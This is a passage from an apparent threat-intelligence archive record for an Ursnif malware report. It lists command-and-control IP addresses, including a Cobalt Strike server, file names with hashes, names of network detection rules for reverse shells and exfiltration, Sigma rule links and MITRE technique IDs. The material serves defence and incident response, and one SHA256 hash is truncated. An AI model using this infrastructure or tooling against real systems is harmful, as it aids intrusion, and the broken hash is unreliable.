IPs:\n\n62.173.149.7\n\n31.41.44.97\n\n5.42.199.83\n\n31.41.44.27\n208.91.197.91\n\n187.190.48.135\n\n210.92.250.133\n\n189.143.170.233\n\n201.103.222.246\n\n151.251.24.5\n\n190.147.189.122\n\n115.88.24.202\n\n211.40.39.251\n\n187.195.146.2\n\n186.182.55.44\n\n222.232.238.243\n\n211.119.84.111\n\n51.211.212.188\n\n203.91.116.53\n\n115.88.24.203\n\n190.117.75.91\n\n181.197.121.228\n\n190.167.61.79\n\n109.102.255.230\n\n211.119.84.112\n\n190.107.133.19\n\n185.95.186.58\n\n175.120.254.9\n\n46.194.108.30\n\n190.225.159.63\n\n190.140.74.43\n\n187.156.56.52\n\n195.158.3.162\n\n138.36.3.134\n\n109.98.58.98\n\n24.232.210.245\n\n222.236.49.123\n\n175.126.109.15\n\n124.109.61.160\n\n95.107.163.44\n\n```\n\n-----\n\n```\n93.152.141.65\n\n5.204.145.65\n\n116.121.62.237\n\n31.166.129.162\n\n222.236.49.124\n\n211.171.233.129\n\n211.171.233.126\n\n211.53.230.67\n\n196.200.111.5\n\n190.219.54.242\n\n190.167.100.154\n\n110.14.121.125\n\n58.235.189.192\n\n37.34.248.24\n\n110.14.121.123\n\n179.53.93.16\n\n175.119.10.231\n\n211.59.14.90\n\n188.48.64.249\n\n187.232.150.225\n\n186.7.85.71\n\n148.255.20.4\n\n91.139.196.113\n\n41.41.255.235\n\n31.167.236.174\n\n189.165.2.131\n\n1.248.122.240\n\n193.106.191.186\n\n\nCobalt Strike:\n\n193.201.9.199\n\n### Computed\n\n```\n\n-----\n\n```\n123.com\n\nd0432468fa4b7f66166c430e1334dbda\n\nf72d978f4d1ca1c435b1164e7617464cc06a9381\n\n7d99c80a1249a1ec9af0f3047c855778b06ea57e11943a271071985afe09e6c2\n\n3488164.iso\n\nf7d85c971e9604cc6d2a2ffcac1ee4a3\n\n67175143196c17f10776bdf5fbf832e50a646824\n\ne999890ce5eb5b456563650145308ae837d940e38aec50d2f02670671d472b99\n\n6570872.lnk\n\nc6b605a120e0d3f3cbd146bdbc358834\n\n328afa8338d60202d55191912eea6151f80956d3\n\n16323b3e56a0cbbba742b8d0af8519f53a78c13f9b3473352fcce2d28660cb37\n\nadcomp.bat\n\neb2335e887875619b24b9c48396d4d48\n\nb658ab9ac2453cde5ca82be667040ac94bfcbe2e\n\n4aa4ee8efcf68441808d0055c26a24e5b8f32de89c6a7a0d9b742cce588213ed\n\nalsoOne.bat\n\nc03f5e2bc4f2307f6ee68675d2026c82\n\n4ce65da98f0fd0fc4372b97b3e6f8fbeec32deb3\n\n6a9b7c289d7338760dd38d42a9e61d155ae906c14e80a1fed2ec62a4327a4f71\n\ncanWell.js\n\n6bb867e53c46aa55a3ae92e425c6df91\n\n6d4f1a9658baccd2e406454b2ad40ca2353916ab\n\n5b51bd2518ad4b9353898ed329f1b2b60f72142f90cd7e37ee42579ee1b645be\n\nfirefox.exe\n\n6a4356bd2b70f7bd4a3a1f0e0bfec9a4\n\n485a179756ff9586587f8728e173e7df83b1ffc3\n\n6c5338d84c208b37a4ec5e13baf6e1906bd9669e18006530bf541e1d466ba819\n\nitsIt.db\n\n60375d64a9a496e220b6eb1b63e899b3\n\nd1b2dd93026b83672118940df78a41e2ee02be80\n\n8e570e32acb99abfd0daf62cff13a09eb694ebfa633a365d224aefc6449f97de\n\nor.jpg\n\n60ca7723edd4f3a0561ea9d3a42f82b4\n\n87b699122dacf3235303a48c74fa2b7a75397c6b\n\nbbcceb987c01024d596c28712e429571f5758f67ba12ccfcae197aadb8ab8051\n\ncook32.rar\n\n3db94cf953886aeb630f1ae616a2ec25\n\n743128253f1df9e0b8ee296cfec17e5fc614f98d\n\n1cdbf7c8a45b753bb5c2ea1c9fb2e53377d07a3c84eb29a1b15cdc140837f654\n\ncook64.rar\n\nd99cc31f3415a1337e57b8289ac5011e\n\n```\n\n-----\n\n```\nf67ce90f66f6721c3eea30581334457d6da23aac\n\nb94810947c33a0a0dcd79743a8db049b8e45e73ca25c9bfbf4bfed364715791b\n\nstilak32.rar\n\na1f634f177f73f112b5356b8ee04ad19\n\n7c82b558a691834caf978621f288af0449400e03\n\nc77ea4ad228ecad750fb7d4404adc06d7a28dbb6a5e0cf1448c694d692598f4f\n\nstilak64.rar\n\n8ea6ad3b1acb9e7b2e64d08411af3c9a\n\n7c04c4567b77981d0d97d8c2eb4ebd1a24053f48\n\ndfdfd0a339fe03549b2475811b106866d035954e9bc002f20b0f69e0f986838f\n\nvnc32.rar\n\n0c5862717f00f28473c39b9cba2953f4\n\n25832c23319fcfe92cde3d443cc731ac056a964a\n\n7ebd70819a79be55d4c92c66e74e90e3309ec977934920aee22cd8d922808c9d\n\nvnc64.rar\n\nce77f575cc4406b76c68475cb3693e14\n\n80fdc4712ae450cfa41a37a24ce0129eff469fb7\n\nf02dc60872f5a9c2fcc9beb05294b57ad8a4a9cef0161ebe008\n\n## Detections\n\n### Network\n\n```\n[Potential Impacket wmiexec.py activity](https://github.com/The-DFIR-Report/Suricata-Rules/blob/main/potential-impacket-wmiexec.py-activity.rules)\n```\nET MALWARE Ursnif Variant CnC Beacon\n\nET MALWARE Ursnif Variant CnC Beacon - URI Struct M2 (_2F)\n\nET INFO HTTP Request to a *.top domain\n\nET DNS Query to a *.top domain - Likely Hostile\n\nET MALWARE Ursnif Variant CnC Data Exfil\n\nET INFO Dotted Quad Host RAR Request\n\nET MALWARE Meterpreter or Other Reverse Shell SSL Cert\n\nET HUNTING Suspicious Empty SSL Certificate - Observed in Cobalt Strike\n\nET POLICY RDP connection confirm\n\nET POLICY MS Remote Desktop Administrator Login Request\n\nET MALWARE Ursnif Variant CnC Beacon 3\n\nET MALWARE Ursnif Payload Request (cook32.rar)\n\nET MALWARE Ursnif Payload Request (cook64.rar)\n\nET INFO Splashtop Domain (splashtop .com) in TLS SNI\n\nET INFO Splashtop Domain in DNS Lookup (splashtop .com)\n\n### Sigma\n\n```\nhttps://github.com/The-DFIR-Report/Sigma[Rules/blob/main/rules/windows/process_creation/proc_creation_win_system_time_lookup.y](https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/rules/windows/process_creation/proc_creation_win_system_time_lookup.yml)\nml\n\n\n-----\n\nhttps://github.com/The-DFIR-Report/SigmaRules/blob/main/rules/windows/process_creation/proc_creation_win_ursnif_loader.yml\nhttps://github.com/SigmaHQ/sigma/blob/b5e783a6d5f2ea0a77f68fb646bfb1b2304e3996/rule\ns/windows/process_creation/proc_creation_win_lolbin_not_from_c_drive.yml\nhttps://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rul\nes/windows/process_creation/proc_creation_win_susp_lolbin_non_c_drive.yml\nhttps://github.com/SigmaHQ/sigma/blob/a674ee246bd02271f5e46d00010320112c9df17c/rul\nes/windows/process_creation/proc_creation_win_wmic_computersystem_recon.yml\nhttps://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rul\nes/windows/process_creation/proc_creation_win_susp_systeminfo.yml\nhttps://github.com/SigmaHQ/sigma/blob/017287804cae36c869f38a7f5671a7501e33178f/rule\ns/windows/pipe_created/pipe_created_mal_cobaltstrike.yml\nhttps://github.com/SigmaHQ/sigma/blob/0db8a8b54d54b52c139f9f7d5c261400d228f54b/rule\ns/windows/process_access/proc_access_win_susp_proc_access_lsass_susp_source.yml\nhttps://github.com/SigmaHQ/sigma/blob/fac67328275e58413f299ed4f69219ff40803d70/rules\n/windows/file/file_event/file_event_win_wmiexec_default_filename.yml\nhttps://github.com/SigmaHQ/sigma/blob/62347bcc80159f1e868a44c80759e85326875b79/rul\nes/windows/process_creation/proc_creation_win_impacket_lateralization.yml\nhttps://github.com/The-DFIR-Report/SigmaRules/blob/c253c57c627b6d8cbcfa06320a3ad1ba2b9dedd4/win_software_splashtop.yml\nhttps://github.com/The-DFIR-Report/SigmaRules/blob/c253c57c627b6d8cbcfa06320a3ad1ba2b9dedd4/win_network_splashtop.yml\nhttps://github.com/SigmaHQ/sigma/blob/7804decd2db84dd1d022801e782d84eca7ecff72/rul\nes/windows/powershell/powershell_script/posh_ps_get_adcomputer.yml\nhttps://github.com/SigmaHQ/sigma/blob/9bf023ceba17aab3d2595c03a8e2345aa08bb976/rul\nes/proxy/proxy_ua_malware.yml\n\n### Yara\n\n## MITRE\n\n\n-----\n\n```\nMshta T1218.005\n\nVisual Basic - T1059.005\n\nCompile After Delivery - T1027.004\n\nBITS Jobs - T1197\n\nCredentials from Password Stores - T1555\n\nLSASS Memory - T1003.001\n\nSystem Information Discovery - T1082\n\nProcess Discovery - T1057\n\nDomain Trust Discovery - T1482\n\nMark-of-the-Web Bypass - T1553.005\n\nMalicious File - T1204.002\n\nSystem Time Discovery - T1124\n\nSystem Owner/User Discovery - T1033\n\nRemote System Discovery - T1018\n\nRemote Desktop Protocol - T1021.001\n\nWindows Management Instrumentation - T1047\n\nDomain Account - T1087.002\n\nProcess Injection - T1055\n\nAsynchronous Procedure Call - T1055.004\n\nRegistry Run Keys / Startup Folder - T1547.001\n\nRemote Access Software - T1219\n\nWeb Protocols - T1071.001\n\nLateral Tool Transfer - T1570\n\nExfiltration Over C2 Channel - T1041\n\n```\nInternal case #17386\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-01-09 - Unwrapping Ursnifs Gifts.pdf"
    ],
    "report_names": [
        "2023-01-09 - Unwrapping Ursnifs Gifts.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "08c8f238-1df5-4e75-b4d8-276ebead502d",
            "created_at": "2023-01-06T13:46:39.344081Z",
            "updated_at": "2025-03-27T02:00:03.056208Z",
            "deleted_at": null,
            "main_name": "Copy-Paste",
            "aliases": [],
            "source_name": "MISPGALAXY:Copy-Paste",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1675303662,
    "ts_updated_at": 1743041614,
    "ts_creation_date": 1675237664,
    "ts_modification_date": 1675237664,
    "files": {
        "pdf": "https://archive.orkl.eu/407e6b4bacbd186569c126deececf564569f629c.pdf",
        "text": "https://archive.orkl.eu/407e6b4bacbd186569c126deececf564569f629c.txt",
        "img": "https://archive.orkl.eu/407e6b4bacbd186569c126deececf564569f629c.jpg"
    }
}